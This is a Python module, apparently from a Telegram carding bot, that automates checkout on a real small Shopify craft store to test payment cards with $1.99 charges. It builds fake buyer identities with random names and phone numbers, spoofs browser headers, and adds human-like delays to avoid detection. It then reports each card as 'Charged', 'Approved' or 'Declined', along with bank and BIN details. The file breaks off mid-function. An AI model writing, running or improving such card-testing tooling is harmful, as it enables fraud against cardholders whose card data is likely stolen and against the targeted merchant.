# BOT/gates/charge/shopify/shopify1.py

import json
import asyncio
import re
import time
import random
import string
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message
import html
import os
import requests

# Import from helper modules
try:
    from BOT.helper.permissions import auth_and_free_restricted
except ImportError:
    def auth_and_free_restricted(func):
        async def wrapper(client, message):
            return await func(client, message)
        return wrapper

try:
    from BOT.helper.Admins import is_command_disabled, get_command_offline_message
except ImportError:
    def is_command_disabled(command_name: str) -> bool:
        return False
    def get_command_offline_message(command_name: str) -> str:
        return "Command is temporarily disabled."

try:
    from BOT.gc.credits import charge_processor
    CHARGE_PROCESSOR_AVAILABLE = True
except ImportError:
    charge_processor = None
    CHARGE_PROCESSOR_AVAILABLE = False

try:
    from TOOLS.getbin import get_bin_details
except ImportError:
    def get_bin_details(bin_number):
        return {}

# ========== DETAILED LOGGER ==========
class ShopifyLogger:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.check_id = f"SO-{random.randint(1000, 9999)}"
        self.start_time = None
        self.step_counter = 0
        self.logs = []

    def start_check(self, card_details):
        self.start_time = time.time()
        self.step_counter = 0
        cc = card_details.split('|')[0] if '|' in card_details else card_details
        masked_cc = cc[:6] + "******" + cc[-4:] if len(cc) > 10 else cc

        log_msg = f"""
🛒 [SHOPIFY $1.99 CHARGE - FAITHANDJOY]
   ├── Check ID: {self.check_id}
   ├── User ID: {self.user_id or 'N/A'}
   ├── Card: {masked_cc}
   ├── Start Time: {datetime.now().strftime('%H:%M:%S')}
   └── Target: faithandjoycraftsupply.com
        """
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def add_log(self, message):
        timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
        self.logs.append(f"[{timestamp}] {message}")

    def step(self, step_num, step_name, action, details=None, status="PROCESSING"):
        self.step_counter += 1
        elapsed = time.time() - self.start_time if self.start_time else 0

        status_icons = {
            "PROCESSING": "🔄", "SUCCESS": "✅", "FAILED": "❌",
            "WARNING": "⚠️", "INFO": "ℹ️", "CAPTCHA": "🛡️",
            "DECLINED": "⛔", "HUMAN": "👤", "CLICK": "🖱️",
            "TYPE": "⌨️", "WAIT": "⏳"
        }
        status_icon = status_icons.get(status, "➡️")

        log_msg = f"{status_icon} STEP {step_num:02d}: {step_name}"
        log_msg += f"\n   ├── Action: {action}"
        log_msg += f"\n   ├── Elapsed: {elapsed:.2f}s"
        log_msg += f"\n   ├── Time: {datetime.now().strftime('%H:%M:%S')}"
        if details:
            log_msg += f"\n   └── Details: {details}"

        self.add_log(log_msg)
        print(log_msg)
        print()
        return log_msg

    def data_extracted(self, data_type, value, source=""):
        if isinstance(value, dict):
            value_str = json.dumps(value, indent=2)
            if len(value_str) > 150:
                value_str = value_str[:147] + "..."
        else:
            value_str = str(value)
            if len(value_str) > 100:
                value_str = value_str[:97] + "..."

        log_msg = f"   ├── 📊 Extracted {data_type}: {value_str}"
        if source:
            log_msg += f"\n   │   └── From: {source}"
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def card_details_log(self, cc, mes, ano, cvv):
        masked_cc = cc[:6] + "******" + cc[-4:]
        log_msg = f"""
   ├── 💳 Card Details:
   │   ├── Number: {masked_cc}
   │   ├── Expiry: {mes}/{ano}
   │   └── CVV: {'*' * len(cvv)}
        """
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def error_log(self, error_type, message, step=""):
        error_icons = {
            "CAPTCHA": "🛡️", "DECLINED": "💳", "FRAUD": "🚫",
            "TIMEOUT": "⏰", "CONNECTION": "🔌", "UNKNOWN": "❓"
        }
        error_icon = error_icons.get(error_type, "⚠️")
        log_msg = f"{error_icon} ERROR [{error_type}]: {message}"
        if step:
            log_msg += f"\n   └── At Step: {step}"
        self.add_log(log_msg)
        print(log_msg)
        print()
        return log_msg

    def success_log(self, message, details=""):
        log_msg = f"✅ SUCCESS: {message}"
        if details:
            log_msg += f"\n   └── Details: {details}"
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def complete_result(self, success, final_status, response_message, total_time):
        result_icon = "✅" if success else "❌"
        result_text = "APPROVED" if success else "DECLINED"

        if len(response_message) > 100:
            response_display = response_message[:97] + "..."
        else:
            response_display = response_message

        log_msg = f"""
{result_icon} [SHOPIFY $1.99 CHARGE COMPLETED]
   ├── Check ID: {self.check_id}
   ├── Result: {result_text}
   ├── Final Status: {final_status}
   ├── Steps Completed: {self.step_counter}
   ├── Total Time: {total_time:.2f}s
   ├── Response: {response_display}
   └── End Time: {datetime.now().strftime('%H:%M:%S')}
        """
        summary = f"📊 SUMMARY: {result_icon} {final_status} | {total_time:.2f}s | Steps: {self.step_counter}"
        self.add_log(log_msg)
        self.add_log(summary)
        print(log_msg)
        print(summary)
        print("="*80)
        return log_msg, summary

    def get_all_logs(self):
        return "\n".join(self.logs)


# ========== UTILITY FUNCTIONS ==========
def load_users():
    try:
        with open("DATA/users.json", "r") as f:
            return json.load(f)
    except:
        return {}

def load_owner_id():
    try:
        with open("FILES/config.json", "r") as f:
            return json.load(f).get("OWNER")
    except:
        return None

def get_user_plan(user_id):
    users = load_users()
    if str(user_id) in users:
        return users[str(user_id)].get("plan", {})
    return {}

def is_user_banned(user_id):
    try:
        if not os.path.exists("DATA/banned_users.txt"):
            return False
        with open("DATA/banned_users.txt", "r") as f:
            return str(user_id) in f.read().splitlines()
    except:
        return False

def check_cooldown(user_id, command_type="so"):
    owner_id = load_owner_id()
    if str(user_id) == str(owner_id):
        return True, 0

    try:
        with open("DATA/cooldowns.json", "r") as f:
            cooldowns = json.load(f)
    except:
        cooldowns = {}

    user_key = f"{user_id}_{command_type}"
    current_time = time.time()

    if user_key in cooldowns:
        last_time = cooldowns[user_key]
        user_plan = get_user_plan(user_id)
        antispam = user_plan.get("antispam", 15) or 15

        if current_time - last_time < antispam:
            return False, antispam - (current_time - last_time)

    cooldowns[user_key] = current_time
    try:
        with open("DATA/cooldowns.json", "w") as f:
            json.dump(cooldowns, f, indent=4)
    except:
        pass

    return True, 0


# ========== FORMAT RESPONSE FUNCTION ==========
def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, user_data):
    fullcc = f"{cc}|{mes}|{ano}|{cvv}"

    try:
        user_id = str(user_data.get("user_id", "Unknown"))
    except:
        user_id = None

    gateway = "Shopify $1.99 Charge 🛒"

    raw_response = str(raw_response) if raw_response else "-"
    raw_response_upper = raw_response.upper()

    # Check for SUCCESS indicators - must have actual order confirmation
    if any(keyword in raw_response_upper for keyword in [
        "ORDER_PLACED", "SUBMITSUCCESS", "SUCCESSFUL", "APPROVED", 
        "COMPLETED", "PAYMENT_SUCCESS", "CHARGE_SUCCESS", "THANK_YOU",
        "ORDER_CONFIRMATION", "YOUR_ORDER_IS_CONFIRMED", "ORDER_CONFIRMED",
        "SHOPIFY_PAYMENTS", "SHOP_PAY", "CHARGED", "LIVE", "ORDER_CONFIRMED",
        "ORDER #", "PROCESSEDRECEIPT", "THANK YOU", "PAYMENT_SUCCESSFUL",
        "PROCESSINGRECEIPT", "AUTHORIZED", "YOUR ORDER IS CONFIRMED"
    ]) and "FAILED" not in raw_response_upper and "FAIL" not in raw_response_upper:
        status_flag = "Charged 💎"
    # Check for CAPTCHA
    elif any(keyword in raw_response_upper for keyword in [
        "CAPTCHA", "SOLVE THE CAPTCHA", "CAPTCHA_METADATA_MISSING", 
        "CAPTCHA DETECTED", "CAPTCHA_REQUIRED", "CAPTCHA_VALIDATION_FAILED", 
        "CAPTCHA_ERROR", "BOT_DETECTED", "HUMAN_VERIFICATION", "SECURITY_CHECK",
        "HCAPTCHA", "CLOUDFLARE", "ENTER PAYMENT INFORMATION AND SOLVE",
        "RECAPTCHA", "I'M NOT A ROBOT", "PLEASE VERIFY"
    ]):
        status_flag = "Captcha ⚠️"
    # Check for PAYMENT ERROR / DECLINED
    elif any(keyword in raw_response_upper for keyword in [
        "THERE WAS AN ISSUE PROCESSING YOUR PAYMENT", "PAYMENT ISSUE",
        "ISSUE PROCESSING", "PAYMENT ERROR", "PAYMENT PROBLEM",
        "TRY AGAIN OR USE A DIFFERENT PAYMENT METHOD", "CARD WAS DECLINED",
        "YOUR PAYMENT COULDN'T BE PROCESSED", "PAYMENT FAILED",
        "FAILEDRECEIPT", "PAYMENTFAILED", "PROCESSINGERROR", "GENERIC_ERROR",
        "DECLINED", "REJECTED", "ERROR", "INVALID", "UNACCEPTABLE_PAYMENT_AMOUNT"
    ]):
        status_flag = "Declined ❌"
    # Check for INSUFFICIENT FUNDS
    elif any(keyword in raw_response_upper for keyword in [
        "INSUFFICIENT FUNDS", "INSUFFICIENT_FUNDS", "FUNDS", "NOT ENOUGH MONEY"
    ]):
        status_flag = "Declined ❌"
    # Check for INVALID CARD
    elif any(keyword in raw_response_upper for keyword in [
        "INVALID CARD", "CARD IS INVALID", "CARD_INVALID", "CARD NUMBER IS INVALID"
    ]):
        status_flag = "Declined ❌"
    # Check for EXPIRED CARD
    elif any(keyword in raw_response_upper for keyword in [
        "EXPIRED", "CARD HAS EXPIRED", "CARD_EXPIRED", "EXPIRATION DATE"
    ]):
        status_flag = "Declined ❌"
    # Check for 3D Secure
    elif any(keyword in raw_response_upper for keyword in [
        "3D", "AUTHENTICATION", "OTP", "VERIFICATION", "CVV-MATCH-OTP", 
        "3DS", "PENDING", "SECURE REQUIRED", "SECURE_CODE", "AUTH_REQUIRED",
        "3DS REQUIRED", "AUTHENTICATION_FAILED", "COMPLETEPAYMENTCHALLENGE",
        "ACTIONREQUIREDRECEIPT", "ADDITIONAL_VERIFICATION_NEEDED",
        "VERIFICATION_REQUIRED", "CARD_VERIFICATION", "AUTHENTICATE"
    ]):
        status_flag = "Approved ❎"
    # Check for CVV errors
    elif any(keyword in raw_response_upper for keyword in [
        "INVALID CVC", "INCORRECT CVC", "CVC_INVALID", "CVV", "SECURITY CODE"
    ]):
        status_flag = "Declined ❌"
    # Check for fraud
    elif any(keyword in raw_response_upper for keyword in [
        "FRAUD", "FRAUD_SUSPECTED", "SUSPECTED_FRAUD", "FRAUDULENT",
        "RISKY", "HIGH_RISK", "SECURITY_VIOLATION", "SUSPICIOUS"
    ]):
        status_flag = "Fraud ⚠️"
    # Default to declined
    else:
        status_flag = "Declined ❌"

    # BIN lookup
    bin_data = get_bin_details(cc[:6]) or {}
    bin_info = {
        "bin": bin_data.get("bin", cc[:6]),
        "country": bin_data.get("country", "Unknown"),
        "flag": bin_data.get("flag", "🏳️"),
        "vendor": bin_data.get("vendor", "Unknown"),
        "type": bin_data.get("type", "Unknown"),
        "level": bin_data.get("level", "Unknown"),
        "bank": bin_data.get("bank", "Unknown")
    }

    try:
        plan = user_data.get("plan", {}).get("plan", "Free")
        badge = user_data.get("plan", {}).get("badge", "🎭")
        first_name = user_data.get("first_name", "User")
    except:
        plan = "Free"
        badge = "🎭"
        first_name = "User"

    clean_name = re.sub(r'[↑←«~∞🏴]', '', first_name).strip()
    profile_display = f"『{badge}』{clean_name}"

    result = f"""
<b>[#Shopify $1.99] | WAYNE</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{fullcc}</code>
<b>[•] Gateway</b> - <b>{gateway}</b>
<b>[•] Status</b>- <code>{status_flag}</code>
<b>[•] Response</b>- <code>{raw_response}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Bin</b>: <code>{bin_info['bin']}</code>  
<b>[+] Info</b>: <code>{bin_info['vendor']} - {bin_info['type']} - {bin_info['level']}</code> 
<b>[+] Bank</b>: <code>{bin_info['bank']}</code> 🏦
<b>[+] Country</b>: <code>{bin_info['country']} - [{bin_info['flag']}]</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By</b>: {profile_display} [<code>{plan} {badge}</code>]
<b>[ϟ] Dev</b> ➺</b> <b><i>DADYY</i></b>
━━━━━━━━━━━━━━━
<b>[ﾒ] T/t</b>: <code>[{timet:.2f} 𝐬]</code> <b>|P/x:</b> [<code>Live ⚡️</code>]
"""
    return result


# ========== API CHECKER CLASS ==========
class ShopifyChargeAPI:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.base_url = "https://www.faithandjoycraftsupply.com"
        self.product_handle = "disney-squish-ears-fun-size"
        self.product_url = f"{self.base_url}/products/{self.product_handle}"

        # Fixed email
        self.email = "brucewayne0002@gmail.com"

        # Random user details
        self.first_names = ["James", "Robert", "John", "Michael", "David", "William", "Richard", 
                           "Joseph", "Thomas", "Charles", "Daniel", "Matthew", "Anthony", "Mark", 
                           "Donald", "Steven", "Paul", "Andrew", "Kenneth", "Joshua", "Kevin", 
                           "Brian", "George", "Timothy", "Ronald", "Edward", "Jason", "Jeffrey"]
        self.last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", 
                          "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", 
                          "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", 
                          "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark"]

        self.first_name = random.choice(self.first_names)
        self.last_name = random.choice(self.last_names)
        self.full_name = f"{self.first_name} {self.last_name}"

        # Generate properly formatted US phone number
        area_code = random.choice([
            "201", "202", "203", "205", "206", "207", "208", "209", "210", "212",
            "213", "214", "215", "216", "217", "218", "219", "220", "224", "225",
            "228", "229", "231", "234", "239", "240", "248", "251", "252", "253",
            "254", "256", "260", "262", "267", "269", "270", "272", "274", "276",
            "281", "283", "301", "302", "303", "304", "305", "307", "308", "309",
            "310", "312", "313", "314", "315", "316", "317", "318", "319", "320",
            "321", "323", "325", "327", "330", "331", "334", "336", "337", "339",
            "341", "346", "347", "351", "352", "360", "361", "364", "380", "385",
            "386", "401", "402", "404", "405", "406", "407", "408", "409", "410",
            "412", "413", "414", "415", "417", "419", "423", "424", "425", "430",
            "432", "434", "435", "440", "442", "443", "445", "458", "469", "470",
            "475", "478", "479", "480", "484", "501", "502", "503", "504", "505",
            "507", "508", "509", "510", "512", "513", "515", "516", "517", "518",
            "520", "530", "531", "534", "539", "540", "541", "551", "559", "561",
            "562", "563", "564", "567", "570", "571", "572", "573", "574", "575",
            "580", "585", "586", "601", "602", "603", "605", "606", "607", "608",
            "609", "610", "612", "614", "615", "616", "617", "618", "619", "620",
            "623", "626", "628", "629", "630", "631", "636", "641", "646", "650",
            "651", "657", "660", "661", "662", "667", "669", "678", "681", "682",
            "701", "702", "703", "704", "706", "707", "708", "712", "713", "714",
            "715", "716", "717", "718", "719", "720", "724", "725", "727", "731",
            "732", "734", "737", "740", "747", "754", "757", "760", "762", "763",
            "765", "769", "770", "772", "773", "774", "775", "779", "781", "785",
            "786", "801", "802", "803", "804", "805", "806", "808", "810", "812",
            "813", "814", "815", "816", "817", "818", "828", "830", "831", "832",
            "843", "845", "847", "848", "850", "856", "857", "858", "859", "860",
            "862", "863", "864", "865", "870", "872", "878", "901", "903", "904",
            "906", "907", "908", "909", "910", "912", "913", "914", "915", "916",
            "917", "918", "919", "920", "925", "928", "929", "930", "931", "936",
            "937", "940", "941", "945", "947", "949", "951", "952", "954", "956",
            "959", "970", "971", "972", "973", "975", "978", "979", "980", "984",
            "985", "989"
        ])
        prefix = str(random.randint(200, 999))
        line_number = str(random.randint(1000, 9999))

        # Store different phone formats for different fields
        # E.164 format: +1XXXXXXXXXX (for buyerIdentity.phone and shopPayArtifact)
        self.phone_e164 = f"+1{area_code}{prefix}{line_number}"
        # Plain format: XXXXXXXXXX (for shopPayOptInPhone.number)
        self.phone_plain = f"{area_code}{prefix}{line_number}"
        # Formatted for display: (XXX) XXX-XXXX (for address fields)
        self.phone_formatted = f"({area_code}) {prefix}-{line_number}"

        # Address details
        self.address = {
            "first_name": self.first_name,
            "last_name": self.last_name,
            "address1": "8 Log Pond Drive",
            "address2": "",
            "city": "Horsham",
            "state": "Pennsylvania",
            "state_code": "PA",
            "zip": "19044",
            "country": "United States",
            "country_code": "US"
        }

        self.logger = ShopifyLogger(user_id)
        self.session = requests.Session()

        # Store proposal response data for use in SubmitForCompletion
        self.proposal_delivery_data = None
        self.proposal_buyer_identity = None
        self.checkout_token = None
        self.session_token = None
        self.queue_token = None
        self.stable_id = None
        self.payment_method_identifier = None
        self.delivery_handle = None
        self.signed_handles = []
        self.receipt_id = None
        self.total_amount = "1.99"  # FIXED: Track exact amount
        self.shipping_amount = "0.00"  # FIXED: Track shipping

    def find_between(self, text, start, end):
        """Extract text between two markers"""
        pattern = re.compile(f'{re.escape(start)}(.*?){re.escape(end)}')
        match = pattern.search(text)
        return match.group(1) if match else None

    async def poll_for_receipt(self, receipt_id, session_token, max_attempts=5):
        """Poll for receipt to get actual payment result"""
        self.logger.step(11, "POLL RECEIPT", "Polling for payment result", f"Receipt: {receipt_id[:50]}...", "WAIT")

        poll_headers = {
            'accept': 'application/json',
            'accept-language': 'en-IN',
            'content-type': 'application/json',
            'origin': self.base_url,
            'referer': self.checkout_url,
            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
            'x-checkout-one-session-token': session_token,
            'x-checkout-web-build-id': '146205538bebcd8f4e98f92af4c5e3405d99d360',
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-server-rendering': 'yes',
            'x-checkout-web-source-id': self.checkout_token,
        }

        # Build GraphQL query for PollForReceipt
        variables = {
            "receiptId": receipt_id,
            "sessionToken": session_token
        }

        # This is a persisted query, need to use GET with parameters
        import urllib.parse
        variables_encoded = urllib.parse.quote(json.dumps(variables))

        poll_url = f'{self.base_url}/checkouts/internal/graphql/persisted?operationName=PollForReceipt&variables={variables_encoded}&id=2f6b14ade727374065e7c7ac82c69f85460c9c41a40b98246066f0fea41d7d7d'

        for attempt in range(max_attempts):
            try:
                response = self.session.get(poll_url, headers=poll_headers)

                if response.status_code == 200:
                    poll_data = response.json()
                    self.logger.data_extracted(f"Poll Attempt {attempt+1}", "Success", "PollForReceipt")

                    receipt = poll_data.get('data', {}).get('receipt', {})
                    receipt_typename = receipt.get('__typename', '')

                    # Check for FailedReceipt
                    if receipt_typename == 'FailedReceipt':
                        processing_error = receipt.get('processingError', {})
                        error_code = processing_error.get('code', 'UNKNOWN')
                        error_msg = processing_error.get('messageUntranslated', 'Payment failed')

                        self.logger.error_log("DECLINED", f"{error_code}: {error_msg}", "PollForReceipt")
                        return False, f"DECLINED - {error_code}: {error_msg}"

                    # Check for ProcessingReceipt (still processing)
                    elif receipt_typename == 'ProcessingReceipt':
                        self.logger.data_extracted("Status", "Still processing", f"Attempt {attempt+1}")
                        await asyncio.sleep(1)
                        continue

                    # Check for successful receipt (should have purchaseOrder)
                    elif 'purchaseOrder' in receipt and receipt['purchaseOrder']:
                        purchase_order = receipt['purchaseOrder']
                        payment_lines = purchase_order.get('payment', {}).get('paymentLines', [])

                        if payment_lines:
                            for line in payment_lines:
                                payment_method = line.get('paymentMethod', {})
                                if payment_method.get('__typename') == 'DirectPaymentMethod':
                                    credit_card = payment_method.get('creditCard', {})
                                    brand = credit_card.get('brand', 'Unknown')
                                    last_digits = credit_card.get('lastDigits', '****')
                                    return True, f"ORDER_PLACED - {brand} ****{last_digits}"

                        return True, "ORDER_PLACED - Payment successful"

                    else:
                        # Unknown receipt type
                        self.logger.data_extracted("Unknown Receipt Type", receipt_typename, "PollForReceipt")
                        return False, f"UNKNOWN - Receipt type: {receipt_typename}"

                else:
                    self.logger.data_extracted(f"Poll Failed", f"Status: {response.status_code}", "PollForReceipt")

            except Exception as e:
                self.logger.error_log("POLL_ERROR", str(e), f"Attempt {attempt+1}")

            await asyncio.sleep(1)

        return False, "POLL_TIMEOUT - Could not get receipt status"

    async def execute_checkout(self, cc, mes, ano, cvv):
        """Execute checkout using requests API (similar to newfile.py)"""
        try:
            self.logger.step(1, "INIT SESSION", "Initializing requests session", f"Phone: {self.phone_formatted}", "INFO")

            # Step 1: Get homepage to establish session
            self.logger.step(2, "GET HOMEPAGE", "Fetching store homepage", self.base_url, "HUMAN")

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'cache-control': 'max-age=0',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
            }

            response = self.session.get(self.base_url, headers=headers)
            self.logger.data_extracted("Homepage Status", response.status_code)

            await asyncio.sleep(random.uniform(1, 2))

            # Step 2: Get product page
            self.logger.step(3, "GET PRODUCT", "Fetching product page", self.product_url, "HUMAN")

            headers['referer'] = self.base_url
            headers['sec-fetch-site'] = 'same-origin'

            response = self.session.get(self.product_url, headers=headers)
            self.logger.data_extracted("Product Page Status", response.status_code)

            # Extract variant ID from product page
            variant_id = self.find_between(response.text, '"variantId":"', '"')
            if not variant_id:
                variant_id = self.find_between(response.text, 'id="ProductSelect-', '"')
            if not variant_id:
                variant_id = self.find_between(response.text, 'value="', '"')  # Try another pattern

            # Fallback to known variant ID for Mickey Mouse
            if not variant_id or not variant_id.isdigit():
                variant_id = "43078484721860"

            self.logger.data_extracted("Variant ID", variant_id, "Product Page")

            await asyncio.sleep(random.uniform(1, 2))

            # Step 3: Add to cart
            self.logger.step(4, "ADD TO CART", "Adding product to cart", f"Variant: {variant_id}", "HUMAN")

            add_to_cart_headers = {
                'accept': '*/*',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': self.base_url,
                'referer': self.product_url,
                'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }

            cart_data = {
                'form_type': 'product',
                'utf8': '✓',
                'id': variant_id,
                'quantity': '1',
            }

            response = self.session.post(f'{self.base_url}/cart/add.js', headers=add_to_cart_headers, data=cart_data)
            self.logger.data_extracted("Add to Cart Status", response.status_code)

            if response.status_code != 200:
                return False, f"ADD_TO_CART_FAILED - Status: {response.status_code}"

            try:
                cart_response = response.json()
                self.logger.data_extracted("Cart Response", cart_response.get('title', 'Unknown'), "Add to Cart")
            except:
                pass

            await asyncio.sleep(random.uniform(1, 2))

            # Step 4: Get cart.js to retrieve cart token
            self.logger.step(5, "GET CART", "Fetching cart details", "Getting cart token", "HUMAN")

            cart_headers = {
                'accept': '*/*',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'referer': self.product_url,
                'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }

            response = self.session.get(f'{self.base_url}/cart.js', headers=cart_headers)

            try:
                cart_json = response.json()
                cart_token = cart_json.get("token", "")
                self.logger.data_extracted("Cart Token", cart_token[:20] + "..." if len(cart_token) > 20 else cart_token)
            except:
                cart_token = ""

            await asyncio.sleep(random.uniform(1, 2))

            # Step 5: Proceed to checkout
            self.logger.step(6, "CHECKOUT", "Proceeding to checkout", "POST /cart", "HUMAN")

            checkout_headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': self.base_url,
                'referer': self.product_url,
                'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
            }

            checkout_data = {
                'updates[]': '1',
                'note': '',
                'checkout': ''
            }

            response = self.session.post(f'{self.base_url}/cart', headers=checkout_headers, data=checkout_data, allow_redirects=True)

            # Extract checkout token from URL
            checkout_token = None
            if 'checkouts/cn/' in response.url:
                checkout_match = re.search(r'/checkouts/cn/([^/?]+)', response.url)
                if checkout_match:
                    checkout_token = checkout_match.group(1)

            if not checkout_token:
                # Try to extract from response text
                checkout_token = self.find_between(response.text, 'checkoutToken&quot;:&quot;', '&quot;')
                if not checkout_token:
                    checkout_token = self.find_between(response.text, '"checkoutToken":"', '"')
                if not checkout_token:
                    checkout_token = self.find_between(response.text, 'id="checkout_token" value="', '"')

            if not checkout_token:
                return False, "CHECKOUT_TOKEN_NOT_FOUND"

            self.checkout_token = checkout_token
            self.logger.data_extracted("Checkout Token", checkout_token, "Checkout URL")
            self.checkout_url = response.url

            await asyncio.sleep(random.uniform(2, 3))

            # Step 6: Extract session token and other required data from checkout page
            self.logger.step(7, "EXTRACT DATA", "Extracting session tokens from checkout page", "Parsing HTML", "INFO")

            response_text = response.text

            # Extract session token (x-checkout-one-session-token)
            session_token = self.find_between(response_text, 'sessionToken&quot;:&quot;', '&quot;')
            if not session_token:
                session_token = self.find_between(response_text, '"sessionToken":"', '"')
            if not session_token:
                # Try alternative patterns
                session_token = self.find_between(response_text, 'serialized-sessionToken" content="&quot;', '&quot;')

            # Extract from JavaScript data if available
            if not session_token:
                # Look for window.checkout or similar
                js_match = re.search(r'window\.__INITIAL_STATE__\s*=\s*({.+?});', response_text, re.DOTALL)
                if js_match:
                    try:
                        initial_state = json.loads(js_match.group(1))
                        session_token = initial_state.get('session', {}).get('token', '')
                    except:
                        pass

            if not session_token:
                return False, "SESSION_TOKEN_NOT_FOUND"

            self.session_token = session_token
            self.logger.data_extracted("Session Token", session_token[:50] + "...", "Checkout Page")

            # Extract queue token
            queue_token = self.find_between(response_text, 'queueToken&quot;:&quot;', '&quot;')
            if not queue_token:
                queue_token = self.find_between(response_text, '"queueToken":"', '"')
            self.queue_token = queue_token
            self.logger.data_extracted("Queue Token", queue_token[:30] + "..." if queue_token else "Not found", "Checkout Page")

            # Extract stable ID - look for multiple patterns
            stable_id = self.find_between(response_text, 'stableId&quot;:&quot;', '&quot;')
            if not stable_id:
                stable_id = self.find_between(response_text, '"stableId":"', '"')
            if not stable_id:
                # Try to find in merchandise lines
                stable_id = self.find_between(response_text, '"merchandiseLines":[{', '}')
                if stable_id:
                    id_match = re.search(r'"stableId":"([^"]+)"', stable_id)
                    if id_match:
                        stable_id = id_match.group(1)

            if not stable_id:
                stable_id = "67c818a5-40a0-4324-8375-2deb7067f5d3"  # Fallback based on laarll.txt

            self.stable_id = stable_id
            self.logger.data_extracted("Stable ID", stable_id, "Checkout Page")

            # Extract payment method identifier - look for shopify_payments
            payment_method_identifier = None
            # Look for shopify_payments in the response
            shopify_payments_match = re.search(r'"paymentMethodIdentifier":"([^"]+)".*?"name":"shopify_payments"', response_text)
            if shopify_payments_match:
                payment_method_identifier = shopify_payments_match.group(1)

            if not payment_method_identifier:
                payment_method_identifier = self.find_between(response_text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
            if not payment_method_identifier:
                payment_method_identifier = self.find_between(response_text, '"paymentMethodIdentifier":"', '"')

            if not payment_method_identifier:
                payment_method_identifier = "23947fd8e9bc407d008e2152e0b66d66"  # Fallback from laarll.txt

            self.payment_method_identifier = payment_method_identifier
            self.logger.data_extracted("Payment Method ID", payment_method_identifier, "Checkout Page")

            # ========== FIXED: Extract delivery strategy handle properly ==========
            # Look for "Economy" shipping specifically and extract its handle
            delivery_handle = None

            # Pattern 1: Look for Economy with handle in availableDeliveryStrategies
            economy_pattern = r'"title":"Economy".*?"handle":"([a-f0-9\-]+)"'
            economy_match = re.search(economy_pattern, response_text)
            if economy_match:
                delivery_handle = economy_match.group(1)

            # Pattern 2: Look for any shipping method with handle containing the pattern
            if not delivery_handle:
                shipping_pattern = r'"handle":"([a-f0-9]{32}-[a-f0-9]{32})"'
                shipping_match = re.search(shipping_pattern, response_text)
